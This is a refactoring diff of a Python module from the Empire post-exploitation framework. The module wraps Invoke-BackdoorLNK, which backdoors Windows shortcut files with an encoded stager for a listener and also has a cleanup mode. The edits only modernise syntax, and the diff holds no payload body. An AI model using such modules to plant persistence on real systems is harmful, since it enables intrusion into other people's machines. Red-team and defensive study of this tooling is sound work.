@@ -1,7 +1,4 @@
-from __future__ import print_function
-
 import os
-from builtins import object, str
 from typing import Dict
 
 from empire.server.common import helpers
@@ -9,7 +6,7 @@ from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -74,9 +71,8 @@ class Module(object):
             script_end += " -CleanUp"
             script_end += " -LNKPath '%s'" % (lnk_path)
             script_end += " -RegPath '%s'" % (reg_path)
-            script_end += (
-                "; \"Invoke-BackdoorLNK cleanup run on lnk path '%s' and regPath %s\""
-                % (lnk_path, reg_path)
+            script_end += "; \"Invoke-BackdoorLNK cleanup run on lnk path '{}' and regPath {}\"".format(
+                lnk_path, reg_path
             )
 
         else:
@@ -84,7 +80,7 @@ class Module(object):
                 # read in an external file as the payload and build a
                 #   base64 encoded version as encScript
                 if os.path.exists(ext_file):
-                    with open(ext_file, "r") as f:
+                    with open(ext_file) as f:
                         file_data = f.read()
 
                     # unicode-base64 encode the script for -enc launching
@@ -121,9 +117,8 @@ class Module(object):
 
             script_end += " -LNKPath '%s'" % (lnk_path)
             script_end += " -EncScript '%s'" % (encScript)
-            script_end += (
-                "; \"Invoke-BackdoorLNK run on path '%s' with stager for listener '%s'\""
-                % (lnk_path, listener_name)
+            script_end += "; \"Invoke-BackdoorLNK run on path '{}' with stager for listener '{}'\"".format(
+                lnk_path, listener_name
             )
 
         script = main_menu.modulesv2.finalize_module(
